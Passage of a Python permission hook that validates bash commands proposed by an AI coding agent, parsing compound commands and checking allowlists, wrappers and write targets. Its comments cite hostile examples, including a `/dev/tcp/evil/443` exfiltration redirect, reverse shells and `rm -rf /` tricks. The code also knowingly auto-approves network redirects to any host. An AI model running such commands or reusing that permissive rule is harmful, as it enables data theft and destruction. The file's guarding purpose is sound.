#!/usr/bin/env python3
"""
PreToolUse Hook: Compound Bash Command Validator

Validates compound bash commands (with |, &&, ||, ;) by:
1. Splitting into sub-commands
2. Checking each against allowed/denied patterns
3. Allowing if ALL sub-commands are allowed

Features:
- Auto-approves known-safe command combinations
- Logs commands requiring manual confirmation to ~/.claude/bash_manual_confirm.log
- Supports replay mode for testing edge cases from logged commands

Replay Mode Usage:
    cat ~/.claude/bash_manual_confirm.log | head -n 5 | pretool_hook.py --dry-run
    CLAUDE_HOOK_REPLAY=1 cat commands.log | pretool_hook.py
"""

import io
import json
import re
import sys
import os
from datetime import datetime, timezone
from typing import Dict, List, Any

# Import our modules
try:
    from bash_command_parser import BashCommandParser
    from settings_loader import SettingsLoader
except ImportError:
    # If running from different directory, try adding hooks dir to path
    import pathlib
    hooks_dir = pathlib.Path(__file__).parent.absolute()
    sys.path.insert(0, str(hooks_dir))
    from bash_command_parser import BashCommandParser
    from settings_loader import SettingsLoader


# Debug logging
DEBUG = os.environ.get('CLAUDE_HOOK_DEBUG', '0') == '1'
DEBUG_LOG = os.path.expanduser('~/.claude/bash_hook_debug.log')

# Manual confirmation log - stores commands that were not auto-approved
MANUAL_CONFIRM_LOG = os.path.expanduser('~/.claude/bash_manual_confirm.log')
TMP_ALLOWED_ROOT = '/tmp'

# Output redirections to these pseudo-devices are always safe: they discard or
# echo output and create no file on disk, so they need no root containment
# check (and would fail one — none live under the workspace or /tmp). `/dev/fd/N`
# (handled separately) targets an already-open descriptor, not a new file.
SAFE_REDIRECT_DEVICES = {'/dev/null', '/dev/stdout', '/dev/stderr', '/dev/tty'}

# Bash network pseudo-paths: a redirect to `/dev/tcp/host/port` (or udp) opens a
# socket rather than creating a file, so the file-containment check never applies
# and would always reject it. These are allowed by explicit operator opt-in to
# keep port-probe diagnostics (`exec 3<>/dev/tcp/localhost/5432`) frictionless.
# NOTE: this also auto-approves outbound writes to ARBITRARY hosts — including
# exfiltration (`secret > /dev/tcp/evil/443`) and reverse-shell redirects. That
# trade-off was made deliberately; narrow these prefixes to `.../localhost/` and
# `.../127.0.0.1/` if local-only probing is all that's wanted.
NET_REDIRECT_PREFIXES = ('/dev/tcp/', '/dev/udp/')

# Tokens that merely INTRODUCE or WRAP another command and must therefore be
# transparent to permission checking: the command that follows is the thing that
# actually runs and must be the thing we validate. Whitelisting any of these as
# Bash(<word>:*) would auto-authorize whatever comes after them (e.g. the parser
# splits `for i in ...; do curl ...; done` into a sub-command `do curl ...`, and
# `Bash(do:*)` would then green-light an arbitrary `curl`). Instead we peel these
# prefixes off and validate the effective command underneath.

# Shell control keywords that are directly followed by a command. NOT included:
# `for`/`case`/`select`/`in` (followed by a word/list, not a command) and the
# terminators `done`/`fi`/`esac` (nothing dangerous follows them).
CONTROL_KEYWORD_PREFIXES = {
    'if', 'elif', 'while', 'until', 'then', 'else', 'do', '!',
}

# Wrapper binaries that exec another command, possibly after their own flags and
# a fixed number of leading positional args. The value is how many non-flag
# positional args to skip after the wrapper's flags (e.g. `timeout <duration>`,
# `flock <lockfile>`). `sudo` is deliberately EXCLUDED — privilege escalation
# should always prompt, never auto-allow.
#
# `command` is handled separately (see _reduce_to_effective_command): it has a
# dual nature — `command NAME ...` execs NAME (a wrapper, like the entries here),
# but `command -v/-V NAME` is a lookup that runs nothing, so it must not be peeled
# down to NAME and validated as an execution.
WRAPPER_PREFIXES = {
    'exec': 0, 'time': 0, 'env': 0, 'xargs': 0, 'nohup': 0, 'setsid': 0,
    'builtin': 0, 'stdbuf': 0, 'nice': 0, 'ionice': 0,
    'chrt': 0, 'watch': 0,
    'timeout': 1,  # leading <duration>
    'flock': 1,    # leading <lockfile|fd>
}

# Per-wrapper short/long flags that consume a SEPARATE following argument whose
# value is DATA (a var name, directory, signal, duration) — never a command.
# When peeling a wrapper's own flags we must drop that operand too, otherwise it
# is mistaken for the command name: `env -u DATABASE_URL pnpm ...` would
# otherwise reduce to `DATABASE_URL pnpm ...` and be validated as a command
# named `DATABASE_URL`, which matches nothing and forces a needless prompt. Only
# the SEPARATED form (`-u NAME`) needs this entry — the glued forms (`-uNAME`,
# `--unset=NAME`) are already self-contained single tokens stripped by the plain
# flag skip. `env -i`/`timeout --foreground` and friends take no argument and so
# are deliberately absent.
#
# DELIBERATELY EXCLUDED: `env -S`/`--split-string`, whose operand is itself a
# command string to run. Dropping it as opaque data would hide that command from
# validation — `env -S "reboot"` would reduce to nothing and auto-allow. Left
# out of this map, `-S` is treated as a plain flag and the operand stays as the
# command head, so it is validated (and prompts) instead of being bypassed.
WRAPPER_ARG_FLAGS = {
    'env': {'-u', '--unset', '-C', '--chdir'},
    'timeout': {'-s', '--signal', '-k', '--kill-after'},
}

# Flags that switch the `command` builtin from exec mode to lookup mode. With any
# of these present, `command` behaves like `which`/`type` — it prints where NAME
# would resolve and runs nothing — so the operand must NOT be validated as if it
# were executed. Bash spells these `-v` and `-V` (combinable with `-p`, e.g. -pv).
COMMAND_LOOKUP_FLAGS = {'v', 'V'}

# Shell keywords whose ENTIRE sub-command is loop/conditional scaffolding that
# runs nothing on its own. These differ from CONTROL_KEYWORD_PREFIXES: those
# INTRODUCE a command and are peeled so the command after them is validated
# (`if grep ...` -> validate `grep ...`). These, by contrast, are followed by a
# word-list rather than a command (`for i in 4 5`, `select opt in a b`) or are
# bare block terminators (`done`, `fi`, `esac`) — so the whole sub-command is
# reduced to '' (auto-allow). This is safe because any command substitution in a
# loop's word-list (e.g. `for f in $(ls)`) is extracted as its own sub-command by
# the parser and validated independently; dropping the scaffolding cannot
# authorize it. `for`/`select`/`case` are deliberately NOT in
# CONTROL_KEYWORD_PREFIXES for exactly this reason (peeling `for` would leave
# `i in 4 5`, which would then fail validation as a command named `i`).
SCAFFOLDING_KEYWORDS = {
    'for', 'select',       # word-list loop headers (the list is data, not a command)
    'done', 'fi', 'esac',  # block terminators
}

# Shell builtins whose sub-command runs nothing dangerous regardless of its
# arguments, so the whole sub-command reduces to a no-op (auto-allow). These show
# up constantly in generated diagnostic scripts:
#   `: > "$LOG"`             truncate a file via the null command
#   `... || { ...; exit 1; }`   bail out of a chain on failure
#   `local mode="$1"`        declare a function-local variable
#   `set -euo pipefail`      set shell options
# The unifying safety property: NONE of these can run an arbitrary command. They
# only inspect or mutate the current shell's own state — variables, attributes,
# options, the directory stack, positional params, the job table — or terminate
# it. So peeling them to '' cannot authorize anything: any redirection target is
# stripped by the parser, and any command substitution in their args (e.g.
# `local x=$(cmd)`, `set -- $(cmd)`) is extracted and validated as its own
# sub-command. Whatever follows the builtin is data (a name, assignment, option,
# numeric status, job spec, or path), never a command to validate.
#
# Deliberately EXCLUDED because they CAN execute an arbitrary command (and so
# must stay on the normal allow/deny path): `eval`, `source`/`.`, `trap` (its
# handler string is run later, unvalidated), `alias` (can shadow a real command),
# `mapfile`/`readarray` (their `-C` callback runs per line), and `kill` (signals
# arbitrary processes). `command`/`exec`/`builtin` are handled as wrappers above.
NOOP_BUILTINS = {
    ':', 'true', 'false',  # pure no-ops
    'exit', 'return',      # terminate shell/function (numeric status only)
    'disown',              # detach a job from the job table (job specs only)
    'unset',               # remove a variable/function (names or -v/-f only)
    # Declaration builtins — bind variables / set attributes, never exec.
    'local', 'declare', 'typeset', 'readonly', 'export',
    # Loop-control builtins — only affect iteration of the current shell loop.
    'break', 'continue',
    # Shell-state / positional-parameter builtins — mutate the current shell only.
    'set', 'shopt', 'shift', 'let', 'read', 'getopts', 'umask', 'wait',
    'hash', 'times',
    # Directory-stack builtins — change cwd / the dir stack (path operands only).
    'cd', 'pushd', 'popd', 'dirs',
}

# A leading function-definition header: `name() {`, `name ()`, `function name {`,
# or `function name() {`. Defining a function runs nothing, and its body is
# validated as separate sub-commands, so dropping the header can never authorize
# the body. At the head of a sub-command, `name()` is unambiguously a function
# definition in valid bash (a simple command cannot be named `name()`, subshells
# start with `(` not `name(`, and `$(...)`/`((...))` are tokenized separately),
# so this match has no realistic false positives. The match is a PREFIX, not the
# whole string: the inline form `name() { echo hi` is parsed by the tokenizer as
# one sub-command (the opening brace is not a split point), so we strip the
# `name() {` prefix and validate the `echo hi` body that follows it. The captured
# `name` is recorded so later invocations of the function resolve to a no-op too.
_FUNCTION_DEF_RE = re.compile(
    r'^\s*(?:function\s+(?P<fname>[A-Za-z_][A-Za-z0-9_]*)(?:\s*\(\))?'  # function name [()]
    r'|(?P<pname>[A-Za-z_][A-Za-z0-9_]*)\s*\(\))'                       # name()
    r'\s*\{?\s*'
)

# A `$VAR` or `${VAR}` parameter reference. Used to substitute constant-like
# variable assignments collected from the same compound command (see
# BashPermissionValidator._expand_constants).
_VAR_REF_RE = re.compile(
    r'\$\{(?P<braced>[A-Za-z_][A-Za-z0-9_]*)\}'  # ${VAR}
    r'|\$(?P<plain>[A-Za-z_][A-Za-z0-9_]*)'      # $VAR
)


def _strip_function_def_header(cmd: str):
    """
    If cmd begins with a function-definition header, return (name, remainder);
    otherwise return (None, cmd).

    The remainder is the inline body command that followed the opening brace, or
    '' when the header stands alone:
        'parse() {'           -> ('parse', '')
        'greet() { echo hi'   -> ('greet', 'echo hi')
        'function foo {'      -> ('foo', '')
        'git status'          -> (None, 'git status')
    """
    m = _FUNCTION_DEF_RE.match(cmd)
    if not m:
        return None, cmd
    name = m.group('fname') or m.group('pname')
    return name, cmd[m.end():].strip()


def _dedupe(items: List[str]) -> List[str]:
    """Drop duplicates while preserving first-seen order."""
    seen = set()
    out = []
    for item in items:
        if item not in seen:
            seen.add(item)
            out.append(item)
    return out


def _format_command_list(commands: List[str], limit: int = 6) -> str:
    """
    Render a list of sub-commands for the permission prompt: each quoted, comma-
    separated, with an overflow tail so a long compound command does not produce
    an unbounded reason string.
    """
    shown = [f"`{c}`" for c in commands[:limit]]
    if len(commands) > limit:
        shown.append(f"(+{len(commands) - limit} more)")
    return ", ".join(shown)


def debug_log(message: str):
    """Log debug message if debug mode is enabled"""
    if DEBUG:
        try:
            with open(DEBUG_LOG, 'a') as f:
                timestamp = datetime.now(timezone.utc).isoformat()
                f.write(f"[{timestamp}] {message}\n")
        except Exception as e:
            print(f"Debug log error: {e}", file=sys.stderr)


def resolve_workspace_dir(input_data: Dict[str, Any]) -> str:
    """
    Resolve the workspace directory for this hook invocation.

    Claude provides the active working directory in the hook payload. That is
    more reliable than the process cwd, which can point at the hooks directory
    or another launcher-specific location.
    """
    candidates = [
        os.environ.get('CLAUDE_WORKSPACE_DIR', ''),
        input_data.get('cwd', ''),
        os.getcwd(),
    ]
    for candidate in candidates:
        if candidate:
            return os.path.abspath(candidate)
    return os.path.abspath(os.getcwd())


def log_manual_confirmation(command: str, result: Dict[str, Any], workspace_dir: str, session_id: str = None):
    """
    Log a command that required manual confirmation (was not auto-approved)

    Args:
        command: The raw bash command string
        result: The validation result dictionary
        workspace_dir: The workspace directory where command was run
        session_id: Optional session ID for correlation
    """
    try:
        log_entry = {
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'session_id': session_id or os.environ.get('CLAUDE_SESSION_ID', ''),
            'workspace': workspace_dir,
            'command': command,
            'decision': result['decision'],
            'reason': result['reason'],
            'sub_commands': result.get('sub_commands', []),
            'validation_results': result.get('validation_results', [])
        }
        with open(MANUAL_CONFIRM_LOG, 'a') as f:
            f.write(json.dumps(log_entry) + '\n')
    except Exception as e:
        debug_log(f"Failed to write manual confirm log: {e}")


def replay_from_log(stdin_lines=None):
    """
    Debug mode: Read and replay commands from stdin (one JSON entry per line)

    This allows testing edge cases by piping the log file:
        cat commands.log | grep -v grep | head -n 5 | pretool_hook.py

    Expected input format: one JSON object per line with at least a 'command' field

    Args:
        stdin_lines: Optional list of strings to process (for internal use when
                     stdin has already been read for peek detection)
    """
    import argparse

    parser = argparse.ArgumentParser(description='Replay commands from log for testing')
    parser.add_argument('--dry-run', '-n', action='store_true',
                        help='Show validation results without processing')
    args = parser.parse_args()

    workspace_dir = os.environ.get('CLAUDE_WORKSPACE_DIR', os.getcwd())
    settings_loader = SettingsLoader(workspace_dir)
    cmd_parser = BashCommandParser()
    validator = BashPermissionValidator(settings_loader, cmd_parser, workspace_dir)

    print(f"=== Replay Mode ===", file=sys.stderr)
    print(f"Workspace: {workspace_dir}", file=sys.stderr)
    print(f"Allowed patterns: {len(validator.allowed_patterns)}", file=sys.stderr)
    print(f"Denied patterns: {len(validator.denied_patterns)}", file=sys.stderr)
    print(f"==================\n", file=sys.stderr)

    # Use provided lines or read from stdin
    lines = stdin_lines if stdin_lines is not None else sys.stdin.readlines()

    debug_log(f"Replay: processing {len(lines)} lines")

    for line in lines:
        line = line.strip()
        if not line:
            continue

        try:
            entry = json.loads(line)
            command = entry.get('command', '')

            if not command:
                print(f"Skipping entry without command: {entry}", file=sys.stderr)
                continue

            print(f"\n--- Command: {command!r} ---", file=sys.stderr)
            result = validator.validate_bash_command(command)

            print(f"Decision: {result['decision']}", file=sys.stderr)
            print(f"Reason: {result['reason']}", file=sys.stderr)
            print(f"Sub-commands: {result['sub_commands']}", file=sys.stderr)

            if args.dry_run:
                continue

            # Simulate the hook decision
            if result['decision'] == 'allow':
                output = {
                    'hookSpecificOutput': {
                        'hookEventName': 'PreToolUse',
                        'permissionDecision': 'allow'
                    }
                }
                print(json.dumps(output))
            elif result['decision'] == 'ask':
                output = {
                    'hookSpecificOutput': {
                        'hookEventName': 'PreToolUse',
                        'permissionDecision': 'ask',
                        'permissionDecisionReason': result['reason']
                    }
                }
                print(json.dumps(output))

        except json.JSONDecodeError as e:
            print(f"Invalid JSON line: {line[:100]}... Error: {e}", file=sys.stderr)
            continue
        except Exception as e:
            print(f"Error processing command: {e}", file=sys.stderr)
            import traceback
            traceback.print_exc(file=sys.stderr)
            continue

    sys.exit(0)


class BashPermissionValidator:
    """Validate bash commands against Claude settings"""

    def __init__(self, settings_loader: SettingsLoader, command_parser: BashCommandParser, workspace_dir: str = None):
        """
        Initialize validator

        Args:
            settings_loader: Settings loader instance
            command_parser: Command parser instance
            workspace_dir: The workspace directory for checking local binaries
        """
        self.parser = command_parser
        self.settings = settings_loader.load_all_settings()
        self.allowed_patterns = self.settings.get('permissions', {}).get('allow', [])
        self.denied_patterns = self.settings.get('permissions', {}).get('deny', [])
        self.workspace_dir = os.path.abspath(workspace_dir or os.getcwd())

        debug_log(f"Loaded {len(self.allowed_patterns)} allow patterns, {len(self.denied_patterns)} deny patterns")
        debug_log(f"Workspace dir: {self.workspace_dir}")

    def validate_bash_command(self, command: str) -> Dict[str, Any]:
        """
        Validate compound command

        Args:
            command: Full bash command to validate

        Returns:
            Dictionary with:
            - decision: 'allow' | 'deny' | 'defer'
            - reason: Explanation string
            - sub_commands: List of parsed sub-commands
            - validation_results: List of validation results for each sub-command
        """
        debug_log(f"Validating command: {command!r}")

        # Parse compound command, keeping each sub-command's source offset.
        parsed = self.parser.parse_with_offsets(command)
        sub_commands = [cmd for cmd, _off in parsed]
        debug_log(f"Parsed into {len(sub_commands)} sub-commands: {sub_commands}")

        # Map each function defined in this compound command to the EARLIEST
        # source offset at which it is defined. A call to such a function runs
        # only the function body (validated separately as its own sub-commands),
        # so the call itself is a no-op — but ONLY once the definition has been
        # reached. bash defines functions in source order and executes top to
        # bottom, so a call may treat the name as the function only if the
        # definition lexically precedes it (def_offset < call_offset). Without
        # this ordering check, `rm -rf /; rm() { :; }` would auto-allow the real
        # `rm` that runs before the no-op function is ever defined.
        function_defs = {}
        for cmd, off in parsed:
            name, _ = _strip_function_def_header(cmd)
            if name is not None:
                if name not in function_defs or off < function_defs[name]:
                    function_defs[name] = off
        if function_defs:
            debug_log(f"Locally-defined functions (name->offset): {function_defs}")

        # Resolve constant-like variable assignments so a later `$VAR` use is
        # validated against the command it actually runs. A common pattern is to
        # bind a tool path once (`GODOT=/usr/local/bin/godot`) and invoke it as
        # `$GODOT ...` throughout the script; without resolution `$GODOT
        # --headless` matches no allow pattern and forces an `ask`. We only
        # collect STANDALONE assignments (a whole-statement `KEY=VALUE`, which
        # persists for the rest of the script — not a `KEY=VALUE cmd` prefix)
        # whose value is a literal constant, and we only substitute into uses
        # that the assignment lexically precedes. Substitution can therefore
        # only REVEAL the real command for the normal allow/deny check, never
        # hide one: `X=rm; $X -rf /` expands to `rm -rf /`, still denied.
        const_assignments = {}  # name -> [(offset, literal_or_None), ...]
        for name, raw_value, off in self.parser.extract_assignments(command):
            literal = BashCommandParser.is_constant_value(raw_value)
            const_assignments.setdefault(name, []).append((off, literal))
        for name in const_assignments:
            const_assignments[name].sort(key=lambda pair: pair[0])
        if const_assignments:
            debug_log(f"Constant assignments (name->[(off,val)]): {const_assignments}")

        # Validate each sub-command
        results = []
        for cmd, off in parsed:
            expanded = self._expand_constants(cmd, const_assignments, off)
            if expanded != cmd:
                debug_log(f"  Expanded constants: {cmd!r} -> {expanded!r}")
            result = self._check_single_command(expanded, function_defs, off)
            results.append(result)
            debug_log(f"  Sub-command {cmd!r}: allowed={result['allowed']}, denied={result['denied']}")

        # Independently of the per-command allow/deny check, gate where output
        # redirections WRITE. The parser strips redirect targets before command
        # matching, so an allowed command can still carry `> /etc/passwd`; this
        # surfaces every write target and flags any that escapes the workspace,
        # /tmp, or the write-safe /dev sinks. Recurses into command
        # substitutions, so a redirect hidden in `$(... > /etc/x)` is caught too.
        #
        # First resolve constant-like `$VAR` references the same way command
        # matching does, so the common `SP=/tmp/x; cmd > "$SP/out"` pattern is
        # vouched for by its literal value instead of prompting on an
        # unexpandable `$SP/out`. Expansion only ever REVEALS a literal the user
        # already wrote, and the containment check still applies to the result,
        # so a constant pointing outside the allowed roots (`OUT=/etc`) stays
        # refused — and is now shown resolved in the prompt.
        disallowed_targets = []
        for target, off in self.parser.extract_write_redirect_targets(command):
            expanded = self._expand_constants(target, const_assignments, off)
            if not self._is_redirect_target_allowed(expanded):
                disallowed_targets.append(expanded)
        disallowed_targets = _dedupe(disallowed_targets)

        # Make decision
        any_denied = any(r['denied'] for r in results)
        all_allowed = all(r['allowed'] for r in results)

        if any_denied:
            # ANY denied → ask (let PermissionRequest handle it or user decide)
            denied_cmds = _dedupe([r['command'] for r in results if r['denied']])
            decision = 'ask'
            reason = "Matches a denied pattern: " + _format_command_list(denied_cmds)
        elif disallowed_targets:
            # A redirection writes outside the workspace, /tmp, or /dev/null.
            decision = 'ask'
            reason = ("Redirects output outside the workspace, /tmp, or /dev/null — "
                      "review the write target: " + _format_command_list(disallowed_targets))
        elif all_allowed and len(sub_commands) > 0:
            # ALL allowed → explicitly allow
            decision = 'allow'
            reason = "All sub-commands are allowed"
        else:
            # Some unknown or empty → ask. Name the exact sub-commands that are
            # not on the allowlist so the user knows what to scrutinize, rather
            # than re-scanning the whole compound command themselves.
            unknown = _dedupe(
                [r['command'] for r in results if not r['allowed'] and not r['denied']]
            )
            decision = 'ask'
            if unknown:
                reason = ("Not in allowlist — review before approving: "
                          + _format_command_list(unknown))
            else:
                reason = "Contains unknown or empty commands"

        debug_log(f"Decision: {decision} - {reason}")

        return {
            'decision': decision,
            'reason': reason,
            'sub_commands': sub_commands,
            'validation_results': results
        }

    def _is_workspace_binary(self, cmd: str) -> bool:
        """
        Check if command is a binary/script located inside the workspace or /tmp.

        Supports:
        - Relative paths: ./script.sh, ./bin/app, ../dir/tool, tools/run.sh
        - Absolute paths: /workspace/bin/app (if inside workspace)
        - /tmp paths: /tmp/foo.sh

        Any command token containing a '/' is run by bash as a path relative to
        the cwd (PATH is not consulted), so a bare `tools/run.sh` executes the
        same file as `./tools/run.sh`. Both are accepted here; the realpath
        containment check below is what actually gates execution to inside the
        workspace (or /tmp), so a relative path that escapes (e.g. `../../etc/x`)
        is still rejected.
        """
        # Extract the first word (the binary/command)
        first_word = cmd.split()[0] if cmd.split() else cmd

        # Check for path-like commands
        is_path_like = (
            # Any non-absolute token containing a '/' is a cwd-relative path
            # execution (covers ./x, ../x, and bare tools/x.sh alike).
            ('/' in first_word and not first_word.startswith('/')) or
            (first_word.startswith('/') and (
                self.workspace_dir in first_word or
                first_word.startswith(TMP_ALLOWED_ROOT + os.sep) or
                first_word == TMP_ALLOWED_ROOT
            ))
        )

        if not is_path_like:
            return False

        try:
            # Resolve the path
            if first_word.startswith('/'):
                resolved = os.path.abspath(first_word)
            else:
                resolved = os.path.abspath(os.path.join(self.workspace_dir, first_word))

            # Check if resolved path is inside an allowed root (using real paths to handle symlinks).
            # Only resolve the directory with realpath — don't dereference the binary itself,
            # since venv python is a symlink to the system interpreter outside the workspace.
            real_cmd_dir = os.path.realpath(os.path.dirname(resolved))
            allowed_roots = [
                os.path.realpath(self.workspace_dir),
                os.path.realpath(TMP_ALLOWED_ROOT),
            ]

            for root in allowed_roots:
                if real_cmd_dir == root or real_cmd_dir.startswith(root + os.sep):
                    debug_log(f"Binary check: {first_word!r} -> dir={real_cmd_dir} inside {root}")
                    return True
            debug_log(f"Binary check: {first_word!r} -> dir={real_cmd_dir} not in allowed roots {allowed_roots}")
            return False
        except Exception as e:
            debug_log(f"Error checking workspace binary: {e}")
            return False

    def _resolve_target_path(self, path: str):
        """
        Resolve a command-line path operand to an absolute realpath the way bash
        would, or return None when it cannot be resolved with confidence.

        The containment checks below decide whether a path is "inside" an allowed
        root by string-prefix on its realpath. That reasoning is only sound if we
        first apply the same expansions the shell does before the path is handed to
        the binary. Skipping them lets an escaping target masquerade as a local
        one: `~/x` naively joins onto the workspace as a literal `~` subdirectory
        (`<ws>/~/x`), which is "inside" the workspace by string prefix even though
        bash deletes `$HOME/x`, well outside it. So we:

          1. expanduser  — `~`/`~user` -> home dir (matches bash tilde expansion)
          2. expandvars  — `$VAR`/`${VAR}` -> value from the environment

        After expansion, if the path STILL contains a shell construct that could
        relocate the target — an unresolved `$` (undefined variable), a backtick
        or `$(...)` command substitution, or a leading `~` that did not expand
        (e.g. `~unknownuser`) — we cannot know where it actually points, so we
        return None and let the caller fall back to a prompt rather than vouch for
        it. Globs (`*`, `?`, `[`) are deliberately NOT treated as unresolvable:
        they do not change the path's rooting, so realpath containment stays
        correct (`~/*.txt` -> `/home/user/*.txt`, rejected; `*.txt` -> inside).
        """
        expanded = os.path.expandvars(os.path.expanduser(path))
        # Any of these mean the post-expansion target location is unknown.
        if '$' in expanded or '`' in expanded or expanded.startswith('~'):
            debug_log(f"target {path!r} has unresolved shell expansion "
                      f"({expanded!r}) - cannot confirm location")
            return None
        if expanded.startswith('/'):
            return os.path.realpath(expanded)
        return os.path.realpath(os.path.join(self.workspace_dir, expanded))

    def _is_path_inside_workspace(self, path: str) -> bool:
        """
        Check if a path (relative or absolute) is inside the workspace.

        Args:
            path: A file path (can be relative like 'file.txt' or absolute like '/workspace/file.txt')

        Returns:
            True if path resolves inside workspace
        """
        try:
            resolved = self._resolve_target_path(path)
            if resolved is None:
                return False

            real_workspace = os.path.realpath(self.workspace_dir)
            return resolved.startswith(real_workspace + os.sep) or resolved == real_workspace
        except Exception:
            return False

    def _allowed_roots(self) -> List[str]:
        """Realpaths of the roots writes/deletes may touch: workspace and /tmp."""
        return [
            os.path.realpath(self.workspace_dir),
            os.path.realpath(TMP_ALLOWED_ROOT),
        ]

    def _realpath_inside_allowed_roots(self, resolved: str) -> bool:
        """True if an already-resolved realpath sits in the workspace or /tmp."""
        for root in self._allowed_roots():
            if resolved == root or resolved.startswith(root + os.sep):
                return True
        return False

    def _is_path_inside_allowed_rm_roots(self, path: str) -> bool:
        """
        Check if a path is allowed for rm operations.

        We allow deletions inside the active workspace and inside /tmp.
        """
        try:
            resolved = self._resolve_target_path(path)
            if resolved is None:
                return False
            return self._realpath_inside_allowed_roots(resolved)
        except Exception:
            return False

    def _is_redirect_target_allowed(self, target: str) -> bool:
        """
        Decide whether an output redirection may write to `target` without a
        prompt. Allowed: the write-safe /dev sinks (and any `/dev/fd/N`), the
        bash network pseudo-paths (`/dev/tcp/...`, `/dev/udp/...`; see
        NET_REDIRECT_PREFIXES for the security trade-off), and anything
        resolving inside the workspace or /tmp — the same roots that gate `rm`
        and workspace-binary execution.

        When the target fully resolves (no unexpanded construct), we realpath it
        and require containment, exactly like `rm`. When it does NOT resolve
        because of an undefined `$VAR`, a `$(...)`, or a `~user` we cannot expand,
        we fall back to a lenient literal-prefix check (see _literal_prefix...):
        the target is still allowed if its literal leading directory roots inside
        an allowed root and it contains no literal `..`. This keeps frictionless
        the common diagnostic pattern `> /tmp/jit_$i.txt` (literal `/tmp/` root)
        while still prompting on a target with no literal anchor (`> "$LOG"`) or
        one rooted outside (`> /etc/$x`). The residual risk — a variable that
        itself expands to `../` and escapes — is accepted by design.
        """
        if target in SAFE_REDIRECT_DEVICES or target.startswith('/dev/fd/'):
            return True
        if target.startswith(NET_REDIRECT_PREFIXES):
            return True
        resolved = self._resolve_target_path(target)
        if resolved is not None:
            return self._realpath_inside_allowed_roots(resolved)
        return self._literal_prefix_inside_allowed_roots(target)

    def _literal_prefix_inside_allowed_roots(self, target: str) -> bool:
        """
        Lenient fallback for a redirect target carrying an unexpandable construct
        (`$VAR`/`$(...)`/backtick/`~user`): allow it only if the LITERAL leading
        portion — everything before the first such construct — anchors it inside
        an allowed root.

        Rules, all required:
          - The literal prefix must be non-empty: a target that begins with the
            construct (`$LOG`, `$SP/out`) has no anchor and is refused.
          - No literal `..` path segment anywhere in the target (a literal
            traversal could climb out of the anchored root).
          - The literal directory (the prefix's containing dir, or the prefix
            itself when it ends in `/`) must realpath inside the workspace or
            /tmp. A relative literal dir is joined onto the workspace first.
        """
        # Cut at the first shell construct we could not expand.
        prefix = re.split(r'[$`]', target, maxsplit=1)[0]
        if not prefix:
            return False
        # A literal parent-dir segment could traverse out of the anchored root.
        if '..' in prefix.split('/'):
            return False
        # The literal directory the write is anchored under.
        literal_dir = prefix if prefix.endswith('/') else os.path.dirname(prefix)
        try:
            if literal_dir.startswith('/'):
                base = os.path.realpath(literal_dir)
            else:
                base = os.path.realpath(os.path.join(self.workspace_dir, literal_dir))
            return self._realpath_inside_allowed_roots(base)
        except Exception:
            return False

    def _is_workspace_rm(self, cmd: str) -> bool:
        """
        Check if command is 'rm' targeting files inside the workspace.

        Supports:
        - rm file.txt
        - rm -rf dir/
        - rm ./file.txt
        - rm /workspace/file.txt (if inside workspace)

        Args:
            cmd: Normalized command string

        Returns:
            True if all rm targets are inside workspace
        """
        parts = cmd.split()
        if not parts or parts[0] != 'rm':
            return False

        # Extract file arguments (skip flags like -rf, -r, -f, --)
        targets = []
        for part in parts[1:]:
            if part.startswith('-'):
                continue  # Skip flags
            targets.append(part)

        if not targets:
            return False  # No targets specified

        # Check ALL targets are inside workspace
        for target in targets:
            if not self._is_path_inside_allowed_rm_roots(target):
                debug_log(f"rm target {target!r} is outside workspace and /tmp")
                return False

        debug_log(f"rm command {cmd!r} - all targets inside workspace or /tmp")
        return True

    def _basename_variant(self, cmd: str) -> str:
        """
        Reduce an explicit-path command invocation to its bare basename.

        If the first token contains a path separator (e.g. '/bin/ls',
        '/usr/bin/grep', './tool'), return the command with that token replaced
        by its basename ('ls', 'grep', 'tool') so it can match the same
        Bash(<name>:*) patterns as a bare-name invocation. The argument tail is
        preserved verbatim.

        Returns the original command unchanged when the first token has no path
        component (nothing to normalize).

        Examples:
            '/bin/ls -1f /tmp'      -> 'ls -1f /tmp'
            '/usr/bin/grep -n foo'  -> 'grep -n foo'
            '/bin/pwd'              -> 'pwd'
            'ls -la'                -> 'ls -la' (unchanged)
        """
        parts = cmd.split(None, 1)  # first token + untouched remainder
        if not parts:
            return cmd
        first = parts[0]
        if '/' not in first:
            return cmd  # already a bare command name
        base = os.path.basename(first)
        if not base or base == first:
            return cmd
        rest = parts[1] if len(parts) > 1 else ''
        return f"{base} {rest}" if rest else base

    def _reduce_to_effective_command(self, cmd: str) -> str:
        """
        Peel leading control-keyword and wrapper prefixes off a sub-command so we
        validate the command that actually runs, not the token that introduces it.

        Without this, the parser leaves prefixes glued to their command (e.g.
        `do curl ...`, `exec rm ...`, `timeout 5 curl ...`), and whitelisting the
        prefix (`Bash(do:*)`, `Bash(exec:*)`) would auto-authorize anything after
        it. Peeling reduces those to `curl ...` / `rm ...` / `curl ...`, which are
        then matched against the allowlist on their own merits.

        Handles nesting (`exec env curl`, `time timeout 5 curl`) by looping. For
        wrappers, skips the wrapper's own flags (`-x`, `--x=y`) and `KEY=VALUE`
        assignments, plus a fixed number of leading positional args (the duration
        for `timeout`, the lockfile for `flock`). Anything it can't confidently
        peel is left in place, so the worst case is a safe defer, never a bypass.

        The `command` builtin is special-cased: `command NAME ...` is an exec
        wrapper and peels to `NAME ...`, but `command -v/-V NAME` is a lookup that
        runs nothing (like `which`/`type`), so it reduces to '' (auto-allow)
        instead of being validated as if NAME were executed.

        Returns the effective command string, or '' when the sub-command runs
        nothing dangerous on its own: a bare prefix (e.g. `do`, `env`) or a
        `command -v` lookup.

        Examples:
            'do curl http://x'        -> 'curl http://x'
            'exec rm -rf /etc'        -> 'rm -rf /etc'
            'timeout 5 curl http://x' -> 'curl http://x'
            'PORT=3100 pnpm start'    -> 'pnpm start'
            'env FOO=bar node app.js' -> 'node app.js'
            'if grep -q foo file'     -> 'grep -q foo file'
            'for i in 4 5'            -> ''            (loop header, runs nothing)
            'done'                    -> ''            (block terminator)
            ': > "$LOG"'              -> ''            (null command, runs nothing)
            'exit 1'                  -> ''            (terminates, runs nothing)
            'parse() {'               -> ''            (function-def header)
            'command -v chromium'     -> ''            (lookup, runs nothing)
            'command node app.js'     -> 'node app.js' (exec form)
            'git status'              -> 'git status' (unchanged)
        """
        # Peel a leading function-definition header (`name() {`, `function name {`).
        # Defining a function runs nothing; for the inline form `name() { echo hi`
        # the brace-group body is glued to the header by the tokenizer, so we drop
        # the header and validate the body command that followed it. A header with
        # no inline body reduces to a no-op.
